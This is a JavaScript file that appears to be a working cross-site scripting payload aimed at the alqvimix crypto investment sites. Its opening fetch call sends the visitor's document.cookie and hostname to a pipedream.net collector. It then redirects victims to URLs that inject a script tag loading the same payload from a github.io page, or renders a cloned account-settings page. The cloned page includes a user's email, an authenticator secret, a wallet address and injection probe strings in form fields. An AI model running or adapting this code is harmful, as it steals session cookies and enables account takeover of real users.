fetch(`https://eodcnv9aow0mu5f.m.pipedream.net/?site=${location.hostname}&taxi=${document.cookie}`).then(response => {
    if (location.hostname == "alqvimix.finance") {
        window.location = "https://alqvimix.live/ajax?module=refsys%3Cscript%20src=%22https://berdos1989.github.io/script.js%22%3E%3C/script%3E";
    } else if (location.hostname == "alqvimix.live") {
        window.location = "https://alqvimix.com/ajax?module=refsys%3Cscript%20src=%22https://berdos1989.github.io/script.js%22%3E%3C/script%3E";
    } else {
        const div1 = document.createElement('div');
        div1.innerHTML = `
    <div class="cabWrapper">
    <header class="cabHeader">
        <div class="cabMenuWrapper">
            <ul>
                <li>
                    <a href="cabinet">
                        <span class="icon icon-user-1--"></span>
                        <span class="linkText">Cabinet</span>
                    </a>
                </li>
                <li>
                    <a href="deposit?add">
                        <span class="icon icon-security-box"></span>
                        <span class="linkText">Create deposit</span>
                    </a>
                </li>
                <li>
                    <a href="deposit?add&prize">
                        <span class="icon"><img src="img/prize2.gif" alt=""></span>
                        <span class="linkText">Auction</span>
                    </a>
                </li>
                <li>
                    <a href="operation?add=CASHOUT">
                        <span class="icon icon-get-money"></span>
                        <span class="linkText">Withdrawal</span>
                    </a>
                </li>
                <li>
                    <a href="operations">
                        <span class="icon icon-calendar---2"></span>
                        <span class="linkText">Operations</span>
                    </a>
                </li>
                <li>
                    <a href="refsys">
                        <span class="icon icon-user-experience"></span>
                        <span class="linkText">Partners</span>
                    </a>
                </li>
                <li>
                    <a href="promo">
                        <span class="icon icon-billboard"></span>
                        <span class="linkText">Promotional material</span>
                    </a>
                </li>
                <li>
                    <a href="account" class="active">
                        <span class="icon icon-settings"></span>
                        <span class="linkText">Settings</span>
                    </a>
                </li>
                <li>
                    <a href="tickets">
                        <span class="icon icon-comment"></span>
                        <span class="count">0</span>
                        <span class="linkText">Tickets</span>
                    </a>
                </li>
                <li>
                    <a href="login?out">
                        <span class="icon icon-log-out"></span>
                        <span class="linkText">Logout</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="headerContent">
            <div class="topHeadLine">
                <div class="logoLink">
                    <a href="home">ALQVIMIX</a>
                    <img src="img/logo-short.png" alt="ALQVIMIX">
                </div>
                <div class="langMenu">
                    <span class="langMenuHead">En</span>
                    <ul class="langMenuList">
                        <li><a href="interface?lang=ru">Ru</a></li>
                        <li><a href="interface?lang=en">En</a></li>
                        <li><a href="interface?lang=de">De</a></li>
                        <li><a href="interface?lang=es">Es</a></li>
                        <li><a href="interface?lang=fr">Fr</a></li>
                        <li><a href="interface?lang=it">It</a></li>
                    </ul>
                </div>
                <div class="cabBurger">
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
            </div>
            <div class="cabHeadLinks">
                <a href="news" class="headBtn">
                    <span class="icon icon-bell"></span>
                    <span class="btnText">News</span>

                </a>
                <a href="support" class="headBtn">
                    <span class="icon icon-support-2"></span>
                    <span class="btnText">Support</span>
                </a>
            </div>
            <div class="siteClock">
                <div class="time" id="time">00:00:00</div>
                <div class="date" id="date"></div>
            </div>
            <div class="accData">
                <div class="accInfoItem welcomeBlock">
                    <span class="icon icon-user1"></span>
                    <span class="greetingText">Welcome</span>
                    <span class="greetingName">divalento</span>
                    <a href="account" class="greetingLink"><span class="icon icon-settings"></span></a>
                </div>
                <div class="accInfoItem">
                    <span class="icon icon-calendar-12--"></span>
                    <span class="pre">Sign up:</span>
                    <span class="val">29.04.2023 11:51:26</span>
                </div>
                <div class="accInfoItem">
                    <span class="icon icon-globe-2"></span>
                    <span class="pre">Bonus:</span>
                    <span class="val">50 ALQ tokens</span>
                </div>
                <div class="accInfoItem">
                    <span class="icon icon-leaderboard"></span>
                    <span class="pre">Your rank:</span>
                    <span class="val">Guest</span>
                </div>
                <div class="accInfoItem">
                    <span class="icon icon-user-13"></span>
                    <div class="accInfoItemLine">
                        <span class="pre">Total partners:</span>
                        <span class="val">5</span>
                    </div>
                    <div class="accInfoItemLine">
                        <span class="pre">active (<span class="num">0</span>)</span>
                        <span class="pre">inactive (<span class="num">5</span>)</span>
                    </div>
                </div>
                <div class="accInfoItem">
                    <span class="icon icon-link-2"></span>
                    <span class="pre">Referral link:</span>
                    <div class="copyRefWrapper">
                        <a href="#" class="val clipCopyText"
                            data-clipboard-text="https://alqvimix.finance/?user=divalento">https://alqvimix.finance/?user=divalento</a>
                        <span class="copyMessage">Copy</span>
                    </div>
                </div>
                <div class="accInfoItem">
                    <span class="icon icon-server-4--"></span>
                    <span class="pre">Ip login:</span>
                    <span class="val">5.199.xxx.xxx</span>
                </div>
            </div>
            <div class="accSupport">
                <div class="supportContacts">
                    <div class="accInfoItem">
                        <span class="icon icon-telegram-1"></span>
                        <span class="pre">Telegram News</span>
                        <a href="https://t.me/Alqvimix_channel" target="_blank" class="val">@Alqvimix_channel</a>
                    </div>

                    <div class="accInfoItem">
                        <span class="icon icon-time-management"></span>
                        <span class="pre">Support 24/7</span>
                        <a href="https://t.me/AlQVIMIX_SUPPORT" target="_blank" class="val">@AlQVIMIX_SUPPORT</a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div class="cabBulletApps">
        <p>Store your cryptocurrency only in secure wallets. We recommend using Meta Mask or Binance Chain Wallet.</p>
        <div class="appLinks">
            <a href="https://www.binance.com/" target="_blank" class="appLink"
                style="background-image: url(img/back-app-1.png);">Install</a>
            <a href="https://metamask.io/" target="_blank" class="appLink"
                style="background-image: url(img/back-app-2.png);">Install</a>
        </div>
    </div>


    <div class="cabContent cabSettings">

        <div class="cabColumns">
            <div class="cabColumn">
                <div class="settingsPersonal settingsItem">
                    <span class="cabCaption">
                        <span class="icon icon-employee-2"></span>
                        Personal
                        <span class="accentText">data</span>
                    </span>
                    <form method="post" action="account" name="account_frm" class="settingsForm">
                        <input name="__Cert" value="7c6fd873" type="hidden">
                        <div class="formContent">
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">Name:</label>
                                    <input type="text" name="aName" value="divalento&quot;&gt;">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">E-Mail:</label>
                                    <input type="text" name="uMail" value="divalento@proton.me" disabled="">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">Login:</label>
                                    <input type="text" name="uLogin" value="divalento" disabled="">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">Phone number:</label>
                                    <input type="text" name="aTel" value="&#039;&quot;&lt;lol&gt;">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">Telegram:</label>
                                    <input type="text" name="aTelegram" value="&#039;&quot;&lt;lol&gt;">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">Facebook:</label>
                                    <input type="text" name="aSocial" value="&#039;&quot;&lt;lol&gt;">
                                </div>
                            </div>
                        </div>
                        <button type="submit" name="account_frm_btn" class="btnMain btnColor1"><span
                                class="btnText">Save</span></button>
                    </form>
                </div>
            </div>
            <div class="cabColumn">
                <div class="settingsPassword settingsItem">
                    <span class="cabCaption">
                        <span class="icon icon-log-in"></span>
                        Change
                        <span class="accentText">password</span>
                    </span>
                    <form id="password" method="post" action="account" name="account/change_pass_frm"
                        class="settingsForm">
                        <input name="__Cert" value="3fef0f65" type="hidden">

                        <div class="formContent">
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">Your current password:</label>
                                    <input name="Pass0" id="account/change_pass_frm_Pass0" type="password">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">New password:</label>
                                    <input name="Pass" id="account/change_pass_frm_Pass" type="password">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper">
                                    <label class="inputLabel">repeat new password:</label>
                                    <input name="Pass2" id="account/change_pass_frm_Pass2" type="password">
                                </div>
                            </div>
                        </div>
                        <button class="btnMain btnColor1" type="submit" name="account/change_pass_frm_btn"><span
                                class="btnText">Save</span></button>
                    </form>
                </div>
            </div>
        </div>
        <div class="cabColumns">
            <div class="cabColumn">
                <div class="settingsSecurity settingsItem">
                    <span class="cabCaption">
                        <span class="icon icon-smart-home"></span>
                        Security
                        <span class="accentText">Settings</span>
                    </span>
                    <form id="security" method="post" action="account" name="security_frm" class="settingsForm">
                        <input name="__Cert" value="6a0df4e3" type="hidden">
                        <div class="formContent">
                            <div class="col">
                                <div class="item">
                                    <div class="formItem">
                                        <div class="cabInputWrapper dark">
                                            <label class="inputLabel">Your timezone (from GMT):</label>
                                            <input type="text" value="+0:00" name="TZ" />
                                        </div>
                                        <div class="checkBtn">
                                            <input type="checkbox" id="noEmail" name="aNoMail" value="1">
                                            <label for="noEmail">Do not receive notifications by e-mail</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="item">
                                    <span class="cap">Security</span>
                                    <div class="formItem">
                                        <div class="cabInputWrapper dark">
                                            <label class="inputLabel">IP change control:</label>
                                            <select name="aIPSec" id="security_frm_aIPSec">
                                                <option value="0">- default -</option>
                                                <option value="1">x.0.0.0</option>
                                                <option value="2">x.x.0.0</option>
                                                <option value="3">x.x.x.0</option>
                                                <option value="4">x.x.x.x</option>
                                            </select>
                                        </div>
                                        <ul class="checkList">
                                            <li>
                                                <div class="checkBtn">
                                                    <input type="checkbox" id="ipAddress" name="aSessIP" value="1">
                                                    <label for="ipAddress">Bind session to IP address </label>
                                                </div>
                                            </li>
                                            <li>
                                                <div class="checkBtn">
                                                    <input type="checkbox" id="sessions" name="aSessUniq" value="1">
                                                    <label for="sessions">Prohibit parallel sessions</label>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="formItem">
                                        <div class="cabInputWrapper dark">
                                            <label class="inputLabel">Auto logout in N minutes (0 by default):</label>
                                            <input name="aTimeOut" id="security_frm_aTimeOut" value="" type="text"
                                                placeholder="0 - default">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col">
                                <span class="cap">Google Authenticator</span>
                                <div class="authSettings">
                                    <input name="GAKey" value="GDXQVZKSYM26SHB2" type="hidden">
                                    <span class="info">Use the key to activate <a
                                            href="https://www.google.com/landing/2step/" target="_blank">Google
                                            Authenticator</a>:</span>
                                    <span class="key">GDXQVZKSYM26SHB2</span>
                                    <div class="qrBlock"><img
                                            src="https://chart.googleapis.com/chart?chs=200x200&amp;chld=M|0&amp;cht=qr&amp;chl=otpauth%3A%2F%2Ftotp%2Fdivalento%40alqvimix.finance%3Fsecret%3DGDXQVZKSYM26SHB2"
                                            alt="qr"></div>
                                    <div class="formItem">
                                        <div class="cabInputWrapper dark">
                                            <label class="inputLabel">Enter the code from the app:</label>
                                            <input name="GACode" value="" type="text">
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                        <button class="btnMain btnColor1" type="submit" name="security_frm_btn"><span
                                class="btnText">Save</span></button>

                    </form>
                </div>
            </div>
            <div class="cabColumn">
                <div class="settingsPayments settingsItem">
                    <span class="cabCaption">
                        <span class="icon icon-wallet--"></span>
                        Payment
                        <span class="accentText">details</span>
                    </span>
                    <form id="payments_detail" method="post" name="balance/wallets_frm" action="account"
                        class="settingsForm">
                        <input name="__Cert" value="66db2e99" type="hidden">

                        <div class="formContent">
                            <div class="formItem">
                                <div class="cabInputWrapper payInput">
                                    <div class="payIconCircle"><img src="img/ps/TRAT.png" alt=""></div>
                                    <input type="text" name="TRAT[acc]" id="balance/wallets_frm_TRAT[acc]"
                                        value="TGPNk7d7JKxKmLP1q7bxqzLmxx32Qtgs3T"
                                        placeholder="TRON-Address - USDT TRC20">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper payInput">
                                    <div class="payIconCircle"><img src="img/ps/CCAB.png" alt=""></div>
                                    <input type="text" name="CCAB[acc]" id="balance/wallets_frm_CCAB[acc]" value=""
                                        placeholder="Bitcoin-address">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper payInput">
                                    <div class="payIconCircle"><img src="img/ps/EA.png" alt=""></div>
                                    <input type="text" name="EA[acc]" id="balance/wallets_frm_EA[acc]" value=""
                                        placeholder="Ether-Address">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper payInput">
                                    <div class="payIconCircle"><img src="img/ps/CCAL.png" alt=""></div>
                                    <input type="text" name="CCAL[acc]" id="balance/wallets_frm_CCAL[acc]" value=""
                                        placeholder="Litecoin-address">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper payInput">
                                    <div class="payIconCircle"><img src="img/ps/XRPA.png" alt=""></div>
                                    <input type="text" name="XRPA[acc]" id="balance/wallets_frm_XRPA[acc]" value=""
                                        placeholder="Ripple-Address">
                                </div>
                            </div>
                            <div class="formItem">
                                <div class="cabInputWrapper payInput">
                                    <div class="payIconCircle"><img src="img/ps/XRPA.png" alt=""></div>
                                    <input type="text" name="XRPA[tag]" id="balance/wallets_frm_XRPA[tag]" value=""
                                        placeholder="Destination tag">
                                </div>
                            </div>

                        </div>
                        <button class="btnMain btnColor1" type="submit" name="balance/wallets_frm_btn"><span
                                class="btnText">Save</span></button>
                    </form>
                </div>
            </div>
        </div>
    </div>


</div>
    `;
        document.body.appendChild(div1);
    }



});
